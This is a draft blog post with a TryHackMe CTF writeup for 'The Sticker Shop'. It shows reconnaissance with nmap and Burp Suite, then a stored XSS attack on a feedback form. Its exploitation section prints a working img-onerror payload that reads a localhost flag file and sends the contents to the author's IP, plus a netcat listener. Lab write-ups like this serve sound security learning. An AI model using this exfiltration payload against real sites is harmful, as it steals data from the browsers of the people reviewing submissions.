+++
date = '2026-10-31T16:13:45+01:00'
draft = true
title = 'The Sticker Shop THM Writeup'
summary = 'The Sticker Shop writeup from TryHackMe'
tags = ["THM", "web", "writeup"]
+++

![The Sticker Shop machine logo](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/logo_The_Sticker_Shop.png)

# Introduction

These are the characteristics of this TryHackMe machine called The Sticker Shop:

- Platform: TryHackMe
- Machine: The Sticker Shop
- Difficulty: Easy
- Category: Web

## Challenge description

Their local sticker shop has finally developed their own website. They don't have much experience with web development, so they decided to develop and host everything on the same computer they use to browse the Internet and check customer reviews. Smart move!

Can you read the flag at http://MACHINE_IP:8080/flag.txt?

## Reconnaissance

For reconnaissance, we're going to run a quick port scan on the machine's IP.

```tmux
nmap -F 10.129.180.138
```
![Port scan to see what kind of machine we're dealing with](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)

After the quick port scan, we can see we have two main ports open: 22 for SSH and 8080, which shows up as an http-proxy. So let's try opening it in our browser with the IP followed by 8080.

![Screenshot of the shop that appears when entering the IP followed by the port](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_tienda_web_The_Sticker_Shop.png)

As we can see, there's no cart or purchase section, and it also says "We only sell stickers at our physical store. Please feel free to stop by!" But I notice there's a feedback section at the top:

![Highlighting the feedback option at the top](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Remarcar_feedback_The_Sticker_Shop.png)

Accessing it, we can see it has a form, which is probably our attack point to compromise this machine.

![Feedback tab of The Sticker Shop](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_Apartado_Feedback_The_Sticker_Shop.png)

On top of this, let's try accessing the flag directly using the URL given in the challenge description:

![Trying to access the URL given in the description to get the flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Acceso_no_permitido_The_Sticker_Shop.png)

As expected, I don't have access.

## Identifying the vulnerability

Okay, after reconnaissance we've found a form, so let's investigate how we can use it to compromise this machine.

To do this, let's see what happens when we submit the form; to intercept this request we'll use Burp Suite.

![Test message in the form](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_enviar_formulario_The_Sticker_Shop.png)

Once submitted, we see this message confirming the form was sent.

![Server response message](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_Respuesta_The_Sticker_Shop.png)

And in Burp Suite we can see that information being sent:

![The POST request we can see in Burp Suite](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/BurpSuite_The_Sticker_Shop.png)

Seeing that the feedback field is probably displayed unsanitized somewhere internally (whatever the staff or admin uses to review it), I figured it might be vulnerable to XSS. If I manage to inject JavaScript there, it would execute in the browser of whoever reviews it, and that could be useful to me.

And here's the key hint from the challenge description: "they host everything on the same computer they use to browse the Internet." That means the browser reviewing the feedback runs on the same machine as the web server, so it has direct access to `http://127.0.0.1:8080/flag.txt`. If I can get that browser to run a script that reads that URL and sends me the result, I'd get the flag without needing direct access to the machine.

## Exploitation

Knowing this, I'm going to craft a payload that, when executed in the machine's browser, reads the flag from `localhost:8080/flag.txt` (which only that machine has access to) and sends it to me via a request to a server — in this case, my own machine using NetCat.

```tmux
<img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
```

In short, here's what this payload does:

- `<img src=x onerror="...">`: forces an image load error so the JavaScript inside `onerror` executes, bypassing basic filters that block `<script>`.
- `fetch('http://127.0.0.1:8080/flag.txt')`: makes the victim's browser request the flag, since that's ultimately what I want.
- `.then(r=>r.text())`: converts the response into plain text so it can be read.
- `.then(d=>fetch('http://192.168.134.213:8000/?data='+d))`: sends that text to my own IP, passing it as a URL parameter.

But for this payload to work, I need to set up a listener to catch whatever it sends us; for that I'll use netcat.

```tmux
nc -lnvp 8000
```

![Netcat listening for requests sent to my IP](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/nc_escuchando_The_Sticker_Shop.png)

I submit the form with this payload in the feedback field, and shortly after I receive the connection with the flag right in the query string:

![Information received from the server at our IP, with the flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Respuesta_nc_flag_The_Sticker_Shop.png)

## Getting the flag

And with that, we've got the flag for this machine, which we pulled from the server by getting it to send it to our IP thanks to the code injection.

![The flag for this level, censored](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/flag_The_Sticker_Shop.png)

## Thanks for reading.